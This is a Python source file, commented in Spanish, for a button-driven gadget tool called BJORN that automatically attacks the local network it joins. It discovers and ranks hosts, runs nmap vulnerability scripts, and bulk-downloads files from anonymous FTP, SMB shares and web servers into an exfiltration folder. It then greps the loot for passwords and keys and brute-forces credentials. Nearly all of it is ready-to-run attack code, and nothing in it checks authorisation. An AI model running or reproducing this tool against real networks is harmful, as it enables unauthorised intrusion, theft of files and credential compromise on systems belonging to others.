#!/usr/bin/env python3
# /opt/beetle/tools/bjorn/bjorn_runner.py

import os
import re
import time
import subprocess
import shutil
from display.screen import MenuDisplay
from config.gpio_config import read_buttons, REPEAT_DELAY
from tools.wifi.lan_scanner import is_wifi_client_connected, get_own_ip

VISIBLE_LINES = 4


class BjornRunner:
    def __init__(self):
        self.display = MenuDisplay()
        self.report_dir = "/opt/beetle/reports/bjorn"
        os.makedirs(self.report_dir, exist_ok=True)

    def _cleanup_processes(self):
        
        self.display.show_message(["Limpiando procesos", "de forma segura..."], center=True)
        time.sleep(0.5)
        for sig in ["TERM", "KILL"]:
            for proc_name in ["nmap", "smbclient", "wget"]:
                try:
                    subprocess.run(
                        ["sudo", "pkill", f"-{sig}", "-f", proc_name],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=5
                    )
                except Exception:
                    pass
            time.sleep(0.3)

    def _prioritize_hosts(self, live_ips):
        
        if not live_ips or len(live_ips) == 1:
            return live_ips[:]

        self.display.show_message(["Priorizando hosts", "por vulnerabilidad..."], center=True)
        time.sleep(0.8)

        num_hosts = len(live_ips)
        quick_rate = "500" if num_hosts > 12 else "900"

        priority_ports = "21,22,23,80,81,82,443,445,139,8000,8001,8080,515,631,9100"

        host_scores = {ip: 0 for ip in live_ips}

        try:
            quick_cmd = [
                "sudo", "nmap", "-p", priority_ports, "-T4",
                "--min-rate", quick_rate, "-n", "-r", "-Pn", "--open", "-oG", "-"
            ] + live_ips

            # Timeout generoso + sin -sV = siempre rápido (<30s incluso con 30 dispositivos)
            result = subprocess.run(quick_cmd, stdout=subprocess.PIPE, text=True, timeout=120)

            # Solo procesamos si nmap terminó bien
            if result.returncode not in (0, 124):
                raise Exception("nmap quick scan error")

            current_ip = None
            for line in result.stdout.splitlines():
                if "Host:" in line:
                    match = re.search(r'Host:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line)
                    if match:
                        current_ip = match.group(1)
                        line_lower = line.lower()
                        if "/open/" in line_lower:
                            if "23/open" in line_lower or "telnet" in line_lower:
                                host_scores[current_ip] += 120
                            elif any(x in line_lower for x in ["80/open", "443/open", "8080/open", "http", "https"]):
                                host_scores[current_ip] += 80
                            elif "21/open" in line_lower or "ftp" in line_lower:
                                host_scores[current_ip] += 40
                            elif "445/open" in line_lower or "smb" in line_lower or "microsoft-ds" in line_lower:
                                host_scores[current_ip] += 30
                            elif "22/open" in line_lower or "ssh" in line_lower:
                                host_scores[current_ip] += 25

            # Orden descendente: más vulnerable primero
            sorted_ips = sorted(live_ips, key=lambda ip: (-host_scores.get(ip, 0), ip))

            high_vuln = [ip for ip in sorted_ips if host_scores.get(ip, 0) >= 80]
            if high_vuln:
                self.display.show_message([f"Alta prioridad: {len(high_vuln)}", "routers/telnet/web"], center=True)
                time.sleep(1.0)

            return sorted_ips

        except Exception:
           
            return live_ips[:]

    def run(self):
        """Menú principal de BJORN"""
        if not is_wifi_client_connected():
            self.display.show_message([" No conectado a ", " WiFi como cliente "], center=True)
            time.sleep(2)
            return

        options = ["SCAN_BJORN", "BORRAR", "BACK"]
        position = 0
        last_pos = -1

        while True:
            buttons = read_buttons()
            if buttons["up"]:
                position = (position - 1) % len(options)
            elif buttons["down"]:
                position = (position + 1) % len(options)
            elif buttons["enter"]:
                choice = options[position]
                if choice == "BACK":
                    self._cleanup_processes()
                    return
                elif choice == "SCAN_BJORN":
                    self._run_scan()
                    position = 0
                    last_pos = -1
                elif choice == "BORRAR":
                    self._clear_reports()
                    position = 0
                    last_pos = -1

            if position != last_pos:
                scroll_offset = max(0, position - VISIBLE_LINES + 1)
                self.display.render(
                    options[scroll_offset:scroll_offset + VISIBLE_LINES],
                    position - scroll_offset
                )
                last_pos = position
            time.sleep(REPEAT_DELAY)

    def _run_scan(self):
      
        self.timestamp = time.strftime("%Y%m%d-%H%M%S")
        self.report_txt = os.path.join(self.report_dir, f"bjorn_scan_{self.timestamp}.txt")
        self.report_xml = os.path.join(self.report_dir, f"bjorn_scan_{self.timestamp}.xml")
        self.brute_report = os.path.join(self.report_dir, f"bjorn_brute_{self.timestamp}.txt")

        self.display.show_message(["INICIANDO BJORN", "Escaneo avanzado", "de vulnerabilidades"], center=True)
        time.sleep(1.2)

        own_ip = get_own_ip()
        if not own_ip:
            self.display.show_message(["Error: No se pudo", "obtener IP propia"], center=True)
            time.sleep(2)
            return

        subnet = ".".join(own_ip.split(".")[:3]) + ".0/24"

        # === Descubrimiento rápido de dispositivos vivos ===
        self.display.show_message([" Descubriendo hosts ", " en LAN... ", f"Snet:{subnet}"], center=False)
        live_ips = []
        try:
            discover_cmd = [
                "sudo", "nmap", "-sn", "-T4", "--min-rate", "1200", "-n", "-r",
                "--open", subnet, "-oG", "-"
            ]
            result = subprocess.run(discover_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    text=True, timeout=25)
            for line in result.stdout.splitlines():
                if "Status: Up" in line:
                    match = re.search(r'Host:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line)
                    if match:
                        ip = match.group(1)
                        if ip != own_ip and ip not in live_ips:
                            live_ips.append(ip)
        except Exception:
            pass

        if not live_ips:
            self.display.show_message(["No se encontraron", "dispositivos conectados"], center=True)
            time.sleep(2)
            return

        # === PRIORIZACIÓN ===
        live_ips = self._prioritize_hosts(live_ips)
        self.display.show_message([f"Encontrados y priorizados:", " {len(live_ips)} "], center=True)
        time.sleep(1.0)

        # Optimización dinámica según cantidad de dispositivos
        num_hosts = len(live_ips)
        if num_hosts > 15:
            vuln_min_rate = "120"
            vuln_host_timeout = "5m"
            brute_min_rate = "30"
            brute_threads = "1"
        elif num_hosts > 8:
            vuln_min_rate = "200"
            vuln_host_timeout = "6m"
            brute_min_rate = "40"
            brute_threads = "1"
        else:
            vuln_min_rate = "280"
            vuln_host_timeout = "8m"
            brute_min_rate = "45"
            brute_threads = "2"

        # === Escaneo de vulnerabilidades ===
        self.display.show_message(["Escaneando", f"{num_hosts} dispositivos","buscando...", "vulnerabilidades..."], center=False)
        try:
            nmap_cmd = [
                "sudo", "nmap", "-sV", "--script", "vuln",
                "-T4", "--min-rate", vuln_min_rate, "--host-timeout", vuln_host_timeout,
                "-n", "-r", "--open",
                "-oN", self.report_txt,
                "-oX", self.report_xml
            ] + live_ips

            result = subprocess.run(nmap_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    text=True, timeout=1500)

            if result.returncode != 0 and result.returncode != 124:
                self.display.show_message([" Error en Nmap ", " Inténtalo de nuevo "], center=True)
                time.sleep(2)
                self._cleanup_processes()
                return
        except subprocess.TimeoutExpired:
            self.display.show_message([" Scan timeout ", " Red muy grande "], center=True)
            time.sleep(2)
            self._cleanup_processes()
            return
        except Exception as e:
            self.display.show_message([" Error inesperado ", str(e)[:20]], center=True)
            time.sleep(2)
            self._cleanup_processes()
            return

        # === Exfiltración ===
        self.display.show_message(["Exfiltrando archivos", "SMB/FTP/HTTP/HTTPS"], center=True)
        exfil_dir = os.path.join(self.report_dir, f"exfil_{self.timestamp}")
        os.makedirs(exfil_dir, exist_ok=True)
        exfil_log = os.path.join(exfil_dir, "exfil_log.txt")

        with open(exfil_log, "w", encoding="utf-8") as log:
            log.write(f"Exfiltración BJORN iniciada: {self.timestamp}\n")
            log.write(f"Dispositivos priorizados: {num_hosts}\n\n")

            for ip in live_ips:
                log.write(f"\n=== IP: {ip} ===\n")
                log.write("→ Intentando FTP anónimo...\n")
                try:
                    ftp_path = os.path.join(exfil_dir, ip, "ftp")
                    os.makedirs(ftp_path, exist_ok=True)
                    subprocess.run([
                        "timeout", "12s", "wget", "--recursive", "--no-parent", "--level=1",
                        "--no-directories", "--quiet", f"ftp://{ip}/", "-P", ftp_path
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
                    log.write(" FTP: Archivos descargados (si accesible)\n")
                except Exception:
                    log.write(" FTP: No accesible / timeout\n")

                # SMB anónimo
                log.write("→ Intentando SMB shares...\n")
                try:
                    list_cmd = ["smbclient", "-L", f"//{ip}", "-N", "-g"]
                    list_out = subprocess.run(list_cmd, capture_output=True, text=True, timeout=12).stdout
                    shares = re.findall(r'Disk\|([^\|\r\n]+)', list_out)
                    if shares:
                        log.write(f" Shares encontrados: {', '.join(shares)}\n")
                        for share in shares:
                            share = share.strip()
                            if any(x in share.upper() for x in ["IPC$", "ADMIN$", "PRINT$", "C$"]):
                                continue
                            share_path = os.path.join(exfil_dir, ip, "smb", share)
                            os.makedirs(share_path, exist_ok=True)
                            dl_cmd = [
                                "timeout", "22s", "smbclient", f"//{ip}/{share}", "-N",
                                "-c", f"recurse; prompt off; lcd {share_path}; mget *; quit"
                            ]
                            subprocess.run(dl_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=25)
                            log.write(f" Share {share}: Archivos intentados descargar\n")
                    else:
                        log.write(" No shares anónimos detectados\n")
                except Exception as e:
                    log.write(f" SMB error: {str(e)[:80]}\n")

                # HTTP/HTTPS anónimo
                log.write("→ Intentando HTTP/HTTPS anónimos...\n")
                for scheme in ["http", "https"]:
                    try:
                        http_path = os.path.join(exfil_dir, ip, scheme)
                        os.makedirs(http_path, exist_ok=True)
                        extra = ["--no-check-certificate"] if scheme == "https" else []
                        wget_cmd = [
                            "timeout", "15s", "wget", "--recursive", "--no-parent", "--level=1",
                            "--no-directories", "--quiet"
                        ] + extra + [f"{scheme}://{ip}/", "-P", http_path]
                        subprocess.run(wget_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=18)
                        log.write(f" {scheme.upper()}: Archivos intentados (si accesible)\n")
                    except Exception:
                        log.write(f" {scheme.upper()}: No accesible / timeout\n")

            # BÚSQUEDA AUTOMÁTICA DE CONTRASEÑAS
            log.write("\n=== BÚSQUEDA DE CONTRASEÑAS EN ARCHIVOS EXFILTRADOS ===\n")
            try:
                pw_find = subprocess.run([
                    "grep", "-r", "-i", "-E",
                    "pass(word)?|passwd|password|user:|clave|contraseña|admin|root|secret|key",
                    exfil_dir
                ], capture_output=True, text=True, timeout=20)
                if pw_find.stdout.strip():
                    log.write("¡POSIBLES CONTRASEÑAS ENCONTRADAS!\n")
                    log.write(pw_find.stdout[:2000] + "\n... (truncado)\n")
                else:
                    log.write("No se encontraron patrones de contraseñas.\n")
            except Exception as e:
                log.write(f"Error en búsqueda PW: {str(e)[:100]}\n")

        # === Fuerza bruta ===
        self.display.show_message(["Fuerza bruta en", "credenciales (SSH/FTP", "WEB y más...)"], center=True)
        time.sleep(1.0)
        try:
            brute_cmd = [
                "sudo", "nmap", "-sV", "--script", "brute",
                "-T3",
                "--script-args", f"brute.threads={brute_threads},http-form-brute.path=/,http-form-brute.passvar=password,http-form-brute.uservar=,http-form-brute.method=POST",
                "--min-rate", brute_min_rate, "--host-timeout", "7m", "-n", "-r", "--open",
                "-oN", self.brute_report
            ] + live_ips

            subprocess.run(brute_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=1500)
        except subprocess.TimeoutExpired:
            self.display.show_message([" Brute timeout ", " continuando... "], center=True)
            time.sleep(1)
        except Exception:
            pass

        # Parse de resultados (sin cambios)
        vulns_list = self._parse_vuln_report(self.report_txt)
        brute_list = self._parse_brute_report(self.brute_report)

        findings_list = vulns_list[:]
        found_ips = {ip for ip, _ in findings_list}

        for ip, bsum in brute_list:
            prefix = "BRUTE: " if ip not in found_ips else "BRUTE + "
            findings_list.append((ip, f"{prefix}{bsum}"))

        if not findings_list:
            self.display.show_message(["No se encontraron:", "- vulnerabilidades", "- credenciales"], center=True)
            time.sleep(2)
            self.display.show_message(["Exfil + Brute en:", f"exfil_{self.timestamp}/", f"bjorn_scan_{self.timestamp}.txt"], center=False)
            time.sleep(4)
            self._cleanup_processes()
            return

        summary_lines = [
            f"FINDINGS: {len(findings_list)} (priorizados)",
            f"Hosts: {num_hosts}"
        ]
        self.display.show_message(summary_lines, center=False)
        time.sleep(2.5)

        # Menú de resultados
        options = [f"{ip} → {summary[:28]}..." for ip, summary in findings_list]
        options.append("BACK")
        position = 0
        scroll_offset = 0
        last_pos = -1

        while True:
            buttons = read_buttons()
            if buttons["up"]:
                position = (position - 1) % len(options)
            elif buttons["down"]:
                position = (position + 1) % len(options)
            elif buttons["enter"]:
                if position == len(options) - 1:
                    self._cleanup_processes()
                    return
                ip, full_summary = findings_list[position]
                detail_lines = [
                    f"IP: {ip}",
                    full_summary[:60],
                    "",
                    "Exfil en:",
                    f"exfil_{self.timestamp}/{ip}/",
                    "Reporte vuln:",
                    f"bjorn_scan_{self.timestamp}.txt",
                    "Reporte brute:",
                    f"bjorn_brute_{self.timestamp}.txt"
                ]
                self.display.show_message(detail_lines, center=False)
                while True:
                    if read_buttons()["enter"]:
                        break
                    time.sleep(REPEAT_DELAY)
                position = 0
                scroll_offset = 0
                last_pos = -1
                continue

            if position != last_pos:
                scroll_offset = max(0, position - VISIBLE_LINES + 1)
                self.display.render(
                    options[scroll_offset:scroll_offset + VISIBLE_LINES],
                    position - scroll_offset
                )
                last_pos = position
            time.sleep(REPEAT_DELAY)

    def _clear_reports(self):
       

        if not os.path.isdir(self.report_dir):
            self.display.show_message(["   Carpeta no existe   "], center=True)
            time.sleep(2)
            return

        # 🔍 Verificar si hay contenido
        has_content = False
        for _, dirs, files in os.walk(self.report_dir):
            if files or dirs:
                has_content = True
                break

        if not has_content:
            self.display.show_message(["   No hay reportes   ", "   para borrar   "], center=True)
            time.sleep(2)
            return

        # ==================== TRANSICIÓN ANTI DOBLE ENTER ====================
        self.display.show_message(["   ¿Borrar TODO?   "], center=True)
        time.sleep(1.0)  

        # 📋 Menú de confirmación
        options = ["NO", "SI, BORRAR TODO"]
        position = 0
        last_pos = -1

        while True:
            buttons = read_buttons()

            if buttons["up"]:
                position = (position - 1) % len(options)
            elif buttons["down"]:
                position = (position + 1) % len(options)

            elif buttons["enter"]:
                if position == 0:
                    self.display.show_message(["  Borrado cancelado   "], center=True)
                    time.sleep(1.5)
                    return
                else:
                    break  # confirma borrado

            # Render pantalla
            if position != last_pos:
                self.display.render(
                    options,
                    position
                )
                last_pos = position

            time.sleep(REPEAT_DELAY)

        # Borrado real
        self.display.show_message(["  Borrando TODO...  "], center=True)
        time.sleep(1)

        try:
            shutil.rmtree(self.report_dir)
            os.makedirs(self.report_dir, exist_ok=True)
            self.display.show_message(["   Listo.   "], center=True)
        except Exception as e:
            self.display.show_message(["  Error borrando.  ", str(e)[:20]], center=True)

        time.sleep(2)   

        
    def _parse_vuln_report(self, report_path):
        
        if not os.path.isfile(report_path):
            return []
        vulns = []
        current_ip = None
        current_vulns = []
        with open(report_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line.startswith("Nmap scan report for"):
                    if current_ip and current_vulns:
                        summary = " | ".join(current_vulns)
                        vulns.append((current_ip, summary))
                    current_ip = None
                    current_vulns = []
                    match = re.search(r"for\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line)
                    if match:
                        current_ip = match.group(1)
                elif current_ip and ("VULNERABLE" in line.upper() or
                                    "CVE-" in line or
                                    "http-vuln" in line or
                                    "ms17-010" in line or
                                    "vuln" in line.lower() or
                                    "csrf" in line.lower() or
                                    "xss" in line.lower() or
                                    "passwd" in line.lower() or
                                    "enum" in line.lower() or
                                    "admin" in line.lower() or
                                    "critical" in line.lower() or
                                    "high" in line.lower()):
                    clean = re.sub(r"^\|?\s*", "", line)
                    clean = clean[:80]
                    if clean and clean not in current_vulns:
                        current_vulns.append(clean)
        if current_ip and current_vulns:
            summary = " | ".join(current_vulns)
            vulns.append((current_ip, summary))

        seen = set()
        unique_vulns = []
        for ip, summary in vulns:
            if ip not in seen and summary.strip():
                seen.add(ip)
                unique_vulns.append((ip, summary))
        return unique_vulns

    def _parse_brute_report(self, report_path):
       
        if not os.path.isfile(report_path):
            return []
        brutes = []
        current_ip = None
        current_brutes = []
        with open(report_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line.startswith("Nmap scan report for"):
                    if current_ip and current_brutes:
                        summary = " | ".join(current_brutes)
                        brutes.append((current_ip, summary))
                    current_ip = None
                    current_brutes = []
                    match = re.search(r"for\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line)
                    if match:
                        current_ip = match.group(1)
                elif current_ip and ("Valid credentials" in line or
                                    "Account found" in line or
                                    "password:" in line.lower() or
                                    "user:" in line.lower() or
                                    "brute:" in line.lower() or
                                    "logged in" in line.lower() or
                                    "success" in line.lower()):
                    clean = re.sub(r"^\|?\s*", "", line)
                    clean = clean[:80]
                    if clean and clean not in current_brutes:
                        current_brutes.append(clean)
        if current_ip and current_brutes:
            summary = " | ".join(current_brutes)
            brutes.append((current_ip, summary))

        seen = set()
        unique_brutes = []
        for ip, summary in brutes:
            if ip not in seen and summary.strip():
                seen.add(ip)
                unique_brutes.append((ip, summary))
        return unique_brutes
